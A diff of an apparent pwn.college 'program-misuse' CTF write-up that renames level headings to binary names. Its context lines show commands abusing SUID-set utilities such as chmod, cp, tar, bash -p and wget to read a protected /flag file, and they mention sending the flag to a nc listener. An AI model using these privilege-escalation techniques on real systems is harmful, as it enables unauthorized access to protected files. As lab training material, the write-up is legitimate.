@@ -3,7 +3,7 @@ custom_edit_url: null
 sidebar_position: 1
 ---
 
-## level 1
+## cat
 
 > I just set the SUID bit on /usr/bin/cat.\
 > Try to use it to read the flag!
@@ -16,7 +16,7 @@ hacker@program-misuse~level1:/$ cat /flag
 
 &nbsp;
 
-## level 2
+## more
 
 > I just set the SUID bit on /usr/bin/more.\
 > Try to use it to read the flag!
@@ -29,7 +29,7 @@ hacker@program-misuse~level2:/$ more /flag
 
 &nbsp;
 
-## level 3
+## less
 
 > I just set the SUID bit on /usr/bin/less.\
 > Try to use it to read the flag!
@@ -40,7 +40,7 @@ hacker@program-misuse~level3:/$ less /flag
 
 &nbsp;
 
-## level 4
+## tail
 
 > I just set the SUID bit on /usr/bin/tail.\
 > Try to use it to read the flag!
@@ -51,7 +51,7 @@ hacker@program-misuse~level4:/$ tail /flag
 
 &nbsp;
 
-## level 5
+## head
 
 > I just set the SUID bit on /usr/bin/head.\
 > Try to use it to read the flag!
@@ -62,7 +62,7 @@ hacker@program-misuse~level5:/$ head /flag
 
 &nbsp;
 
-## level 6
+## sort
 
 > I just set the SUID bit on /usr/bin/sort.\
 > Try to use it to read the flag!
@@ -73,7 +73,7 @@ hacker@program-misuse~level6:/$ sort /flag
 
 &nbsp;
 
-## level 7
+## vim
 
 > I just set the SUID bit on /usr/bin/vim.\
 > Try to use it to read the flag!
@@ -84,7 +84,7 @@ hacker@program-misuse~level7:/$ vim /flag
 
 &nbsp;
 
-## level 8
+## emacs
 
 > I just set the SUID bit on /usr/bin/emacs.\
 > Try to use it to read the flag!
@@ -95,7 +95,7 @@ hacker@program-misuse~level8:/$ emacs /flag
 
 &nbsp;
 
-## level 9
+## nano
 
 > I just set the SUID bit on /usr/bin/nano.\
 > Try to use it to read the flag!
@@ -106,7 +106,7 @@ hacker@program-misuse~level9:/$ nano /flag
 
 &nbsp;
 
-## level 10
+## rev
 
 > I just set the SUID bit on /usr/bin/rev.\
 > Try to use it to read the flag!
@@ -125,7 +125,7 @@ hacker@program-misuse~level10:/$ rev /flag | rev
 
 &nbsp;
 
-## level 11
+## od
 
 > I just set the SUID bit on /usr/bin/od.\
 > Try to use it to read the flag!
@@ -140,7 +140,7 @@ hacker@program-misuse~level11:/$ od -c /flag
 
 &nbsp;
 
-## level 12
+## hd
 
 > I just set the SUID bit on /usr/bin/hd.\
 > Try to use it to read the flag!
@@ -153,7 +153,7 @@ hacker@program-misuse~level12:/$ hd /flag
 
 &nbsp;
 
-## level 13
+## xxd
 
 > I just set the SUID bit on /usr/bin/xxd.\
 > Try to use it to read the flag!
@@ -166,7 +166,7 @@ hacker@program-misuse~level13:/$ xxd /flag
 
 &nbsp;
 
-## level 14
+## base32
 
 > I just set the SUID bit on /usr/bin/base32.\
 > Try to use it to read the flag!
@@ -187,7 +187,7 @@ hacker@program-misuse~level14:/$ base32 /flag | base32 -d
 
 &nbsp;
 
-## level 15
+## base64
 
 > I just set the SUID bit on /usr/bin/base64.\
 > Try to use it to read the flag!
@@ -208,7 +208,7 @@ hacker@program-misuse~level15:/$ base64 /flag | base64 -d
 
 &nbsp;
 
-## level 16
+## split
 
 > I just set the SUID bit on /usr/bin/split.\
 > Try to use it to read the flag!
@@ -229,7 +229,7 @@ hacker@program-misuse~level16:~$ cat xaa
 
 &nbsp;
 
-## level 17
+## gzip
 
 > I just set the SUID bit on /usr/bin/gzip.\
 > Try to use it to read the flag!
@@ -248,7 +248,7 @@ hacker@program-misuse~level17:/$ gzip -c -d /flag.gz
 
 &nbsp;
 
-## level 18
+## bzip2
 
 > I just set the SUID bit on /usr/bin/bzip2.\
 > Try to use it to read the flag!
@@ -263,7 +263,7 @@ hacker@program-misuse~level18:/$ bzip2 -c /flag | bzip2 -d
 
 &nbsp;
 
-## level 19
+## zip
 
 > I just set the SUID bit on /usr/bin/zip.\
 > Try to use it to read the flag!
@@ -278,7 +278,7 @@ hacker@program-misuse~level19:/$ zip /flag.zip /flag && cat /flag.zip
 
 &nbsp;
 
-## level 20
+## tar
 
 > I just set the SUID bit on /usr/bin/tar.\
 > Try to use it to read the flag!
@@ -291,7 +291,7 @@ hacker@program-misuse~level20:/$ tar -cvf flag.tar /flag && cat flag.tar
 
 &nbsp;
 
-## level 21
+## ar
 
 > I just set the SUID bit on /usr/bin/ar.\
 > Try to use it to read the flag!
@@ -306,7 +306,7 @@ hacker@program-misuse~level21:/$ ar r /flag.a /flag && cat /flag.a
 
 &nbsp;
 
-## level 22
+## cpio
 
 > I just set the SUID bit on /usr/bin/cpio.\
 > Try to use it to read the flag!
@@ -321,7 +321,7 @@ hacker@program-misuse~level22:~$ find /flag | cpio -o > flag.cpio && cat flag.cp
 
 &nbsp;
 
-## level 23
+## genisoimage
 
 > I just set the SUID bit on /usr/bin/genisoimage.\
 > Try to use it to read the flag!
@@ -336,7 +336,7 @@ hacker@program-misuse~level23:/$ for option in $(genisoimage --help 2>&1 | grep 
 
 &nbsp;
 
-## level 24
+## env
 
 > I just set the SUID bit on /usr/bin/env.\
 > Try to use it to read the flag!
@@ -351,7 +351,7 @@ hacker@program-misuse~level24:/$ env cat /flag
 
 &nbsp;
 
-## level 25
+## find
 
 > I just set the SUID bit on /usr/bin/find.\
 > Try to use it to read the flag!
@@ -369,7 +369,7 @@ pwn.college{UsQ6vfq4dFoZ1Q5jlesvmOxUwqA.01N2EDL4ITM0EzW}
 
 &nbsp;
 
-## level 26
+## make
 
 > I just set the SUID bit on /usr/bin/make.\
 > Try to use it to read the flag!
@@ -391,7 +391,7 @@ hacker@program-misuse~level26:~$ make
 
 &nbsp;
 
-## level 27
+## nice
 
 > I just set the SUID bit on /usr/bin/nice.\
 > Try to use it to read the flag!
@@ -404,7 +404,7 @@ hacker@program-misuse~level27:/$ nice cat /flag
 
 &nbsp;
 
-## level 28
+## timeout
 
 > I just set the SUID bit on /usr/bin/timeout.\
 > Try to use it to read the flag!
@@ -417,7 +417,7 @@ hacker@program-misuse~level28:/$ timeout 1 cat /flag
 
 &nbsp;
 
-## level 29
+## stdbuf
 
 > I just set the SUID bit on /usr/bin/stdbuf.\
 > Try to use it to read the flag!
@@ -432,7 +432,7 @@ hacker@program-misuse~level29:~$ stdbuf -i0 cat /flag
 
 &nbsp;
 
-## level 30
+## setarch
 
 > I just set the SUID bit on /usr/bin/setarch.\
 > Try to use it to read the flag!
@@ -445,7 +445,7 @@ hacker@program-misuse~level30:/$ setarch -R cat /flag
 
 &nbsp;
 
-## level 31
+## watch
 
 > I just set the SUID bit on /usr/bin/watch.\
 > Try to use it to read the flag!
@@ -458,7 +458,7 @@ hacker@program-misuse~level30:/$ watch -x cat /flag
 
 &nbsp;
 
-## level 32
+## socat
 
 > I just set the SUID bit on /usr/bin/socat.\
 > Try to use it to read the flag!
@@ -482,7 +482,7 @@ If we check back on our listener, we should have flag.
 
 &nbsp;
 
-## level 33
+## whiptail
 
 > I just set the SUID bit on /usr/bin/whiptail.\
 > Try to use it to read the flag!
@@ -497,7 +497,7 @@ hacker@program-misuse~level33:/$ whiptail --textbox --scrolltext "$LFILE" 10 50
 
 &nbsp;
 
-## level 34
+## awk
 
 > I just set the SUID bit on /usr/bin/awk.\
 > Try to use it to read the flag!
@@ -512,7 +512,7 @@ hacker@program-misuse~level34:/$ awk '{print $0}' /flag
 
 &nbsp;
 
-## level 35
+## sed
 
 > I just set the SUID bit on /usr/bin/sed.\
 > Try to use it to read the flag!
@@ -525,7 +525,7 @@ hacker@program-misuse~level35:/$ sed 's/""/""/' /flag
 
 &nbsp;
 
-## level 36
+## ed
 
 > I just set the SUID bit on /usr/bin/ed.\
 > Try to use it to read the flag!
@@ -542,7 +542,7 @@ The stream has been opened. We can now type `p` to retrieve the flag which start
 
 &nbsp;
 
-## level 37
+## chown
 
 > I just set the SUID bit on /usr/bin/chown.\
 > Try to use it to read the flag!
@@ -555,7 +555,7 @@ hacker@program-misuse~level37:/$ chown hacker /flag && cat /flag
 
 &nbsp;
 
-## level 38
+## chmod
 
 > I just set the SUID bit on /usr/bin/chmod.\
 > Try to use it to read the flag!
@@ -568,7 +568,7 @@ hacker@program-misuse~level38:/$ chmod 777 /flag && cat /flag
 
 &nbsp;
 
-## level 39
+## cp
 
 > I just set the SUID bit on /usr/bin/cp.\
 > Try to use it to read the flag!
@@ -589,7 +589,7 @@ hacker@program-misuse~level1:~$ cat flag.copy
 
 &nbsp;
 
-## level 40 
+## mv
 
 > I just set the SUID bit on /usr/bin/mv.\
 > Try to use it to read the flag!
@@ -610,7 +610,7 @@ hacker@program-misuse~level1:~$ cat flag.move
 
 &nbsp;
 
-## level 41
+## perl
 
 > I just set the SUID bit on /usr/bin/perl.\
 > Try to use it to read the flag!
@@ -631,7 +631,7 @@ hacker@program-misuse~level41:~$ perl babysuid41.pl
 
 &nbsp;
 
-## level 42
+## python
 
 > I just set the SUID bit on /usr/bin/python.\
 > Try to use it to read the flag!
@@ -651,7 +651,7 @@ hacker@program-misuse~level42:~$ python babysuid42.py
 
 &nbsp;
 
-## level 43
+## ruby
 
 > I just set the SUID bit on /usr/bin/ruby.\
 > Try to use it to read the flag!
@@ -672,7 +672,7 @@ hacker@program-misuse~level43:~$ ruby babysuid43.rb
 
 &nbsp;
 
-## level 44
+## bash
 
 > I just set the SUID bit on /usr/bin/bash.\
 > Try to use it to read the flag!
@@ -691,7 +691,7 @@ hacker@program-misuse~level44:~$ bash -p babysuid44.sh
 
 &nbsp;
 
-## level 45
+## date
 
 > I just set the SUID bit on /usr/bin/date.\
 > Try to use it to read the flag!
@@ -706,7 +706,7 @@ hacker@program-misuse~level45:/$ date -f /flag
 
 &nbsp;
 
-## level 46
+## dmesg
 
 > I just set the SUID bit on /usr/bin/dmesg.\
 > Try to use it to read the flag!
@@ -721,7 +721,7 @@ hacker@program-misuse~level46:/$ dmesg -F /flag
 
 &nbsp;
 
-## level 47
+## wc
 
 > I just set the SUID bit on /usr/bin/wc.\
 > Try to use it to read the flag!
@@ -736,7 +736,7 @@ hacker@program-misuse~level47:/$ wc --files0-from=/flag
 
 &nbsp;
 
-## level 48
+## gcc
 
 > I just set the SUID bit on /usr/bin/gcc.\
 > Try to use it to read the flag!
@@ -763,7 +763,7 @@ Since we are including `/flag`, which we do not have access to the compilation i
 
 &nbsp;
 
-## level 49
+## as
 
 > I just set the SUID bit on /usr/bin/as.\
 > Try to use it to read the flag!
@@ -776,7 +776,7 @@ hacker@program-misuse~level49:/$ as /flag
 
 &nbsp;
 
-## level 50
+## wget
 
 > I just set the SUID bit on /usr/bin/wget.\
 > Try to use it to read the flag!
@@ -804,7 +804,7 @@ If we check back on the `nc` listener, we should have received the flag.
 
 &nbsp;
 
-## level 51
+## ssh-keygen
 
 ```c
 include <stdio.h>
